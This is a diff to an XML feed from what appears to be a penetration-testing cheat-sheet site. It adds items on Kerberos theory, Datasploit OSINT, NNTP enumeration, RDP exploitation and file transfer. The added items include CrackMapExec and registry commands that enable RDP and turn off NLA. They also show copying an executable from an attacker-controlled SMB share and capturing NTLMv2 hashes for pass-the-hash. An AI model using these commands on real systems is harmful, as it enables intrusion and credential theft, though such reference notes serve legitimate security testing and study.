       <description>General Informations # Performs automated OSINT on a domain / email / username / IP and find out relevant information from different sources. # Easy to contribute OSINT Framework. # Code for Banner, Main and Output function. Datasploit automagically do rest of the things for you. # Useful for Pen-testers, Bug Bounty Hunters, Cyber Investigators, Product companies, Security Engineers, etc. # Collaborate the results, show them in a consolidated manner.</description>
+    </item>
+    
+    <item>
+      <title>Kerberos</title>
+      <link>/windows-systems/exploitation/kerberos/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/exploitation/kerberos/</guid>
+      <description>General &amp;amp; Theory # Kerberos is just SSO, it&amp;#39;s like SAML or OpenID. # Authentication to a trusted source (KDC) # KDC delegates access # KDC = Key Distribution Center # AS = Authentication Service # TGT= Ticket Granting Ticket # TGS = Ticket Graning Service # In network, protocol used is KRB5 # TGS are for resources, not hosts # Authentication Process # - Authenticate to AS with a password → Get a TGT # - Request access to resource from TGS → Show TGT # - Valid TGT → Get TGS # - Show TGS to resource → resource accepts TGS → Log in # Each resource can check for valid TGS → Privileged Attribute Certificate (PAC) → Addition to Kerberos # NTLM Authentication # - chall/response using NT hash # - NTLMSSP # Communication with DC over NetLogon (RPC)</description>
     </item>
     
     <item>
@@ -779,6 +999,16 @@ UserRecon https://github.com/thelinuxchoice/userrecon # Find usernames across ov
     </item>
     
     <item>
+      <title>RDP Exploitation</title>
+      <link>/windows-systems/exploitation/rdp_exploitation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/exploitation/rdp_exploitation/</guid>
+      <description>Remote and Auto # Remotely enable RDP using CrackMapExec sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable 
+cmd.exe # Enable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 1 /f # Disable NLA (Network Layer Authentication) requirement reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34; /v UserAuthentication /t REG_DWORD /d 0 /f # You can also do it through the firewall netsh firewall set service remoteadmin enable netsh firewall set service remotedesktop enable</description>
+    </item>
+    
+    <item>
       <title>Windows Shells Methods</title>
       <link>/shells-methods/windows/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -795,6 +1025,17 @@ UserRecon https://github.com/thelinuxchoice/userrecon # Find usernames across ov
       <guid>/recon-enumeration/services-enumeration/119_nntp/</guid>
       <description> Banner Grabbing # Using telnet telnet IP 119 # Using netcat nc -nv IP 119 LIST 
 Identification and manual test # Using netcat nc -nv IP 119 LIST GROUP group_name to display related messages POST From; test@knacki.fr Newsgroups: group_name Subject: Test This is a test. . HEAD identity_article ARTICLE identity_article BODY identity_article</description>
+    </item>
+    
+    <item>
+      <title>File Transfer</title>
+      <link>/windows-systems/exploitation/file_transfer/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/exploitation/file_transfer/</guid>
+      <description>/etc/init.d/pure-ftpd 
+SMB Server setup # Set up a SMB server using smbserver.py from impacket smbserver.py SHARE_NAME path/to/share # From target Windows: net view \\KALI_IP (Should display the SHARE_NAME) dir \\KALI_IP\SHARE_NAME copy \\KALI_IP\SHARE_NAME\file.exe . # Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user # can be usefull to PTH, or crack passwords 
+Build a FTP and transfer file # Set up a ftp downloading script on the target machine: echo open IP 21 &amp;gt; ftp.</description>
     </item>
     
     <item>
